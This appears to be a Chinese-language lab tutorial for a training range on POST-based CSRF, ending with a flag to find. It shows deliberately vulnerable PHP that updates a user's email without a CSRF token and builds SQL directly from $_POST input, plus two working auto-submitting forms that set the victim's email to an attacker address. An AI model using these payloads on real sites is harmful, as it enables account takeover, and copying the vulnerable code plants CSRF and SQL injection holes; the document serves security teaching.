# POST 型 CSRF

## 概述

当敏感操作使用 POST 请求时，攻击者需要构造一个自动提交的表单来完成 CSRF 攻击。

## 漏洞代码

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    // 直接更新，没有 CSRF token
    $sql = "UPDATE users SET email = '$email' WHERE id = $user_id";
    mysqli_query($conn, $sql);
}
?>
```

## 攻击方式

### 自动提交表单

```html
<html>
<body onload="document.getElementById('csrf-form').submit();">
  <form id="csrf-form" action="http://target.com/profile" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>
</html>
```

### JavaScript 提交

```html
<form id="csrf-form" action="http://target.com/profile" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>
```

## 关键点

- `document.getElementById('form').submit()` 可以自动提交表单
- 浏览器会自动携带目标域的 Cookie
- 用户无需点击任何东西，访问恶意页面即触发

## 练习步骤

1. 登录靶场，查看修改邮箱功能
2. 用 Burp Suite 抓包，观察 POST 请求格式
3. 构造恶意 HTML 页面
4. 访问恶意页面，验证邮箱是否被修改

## flag

在修改成功页面或数据库中查找 `CR{...}` 格式的 flag。
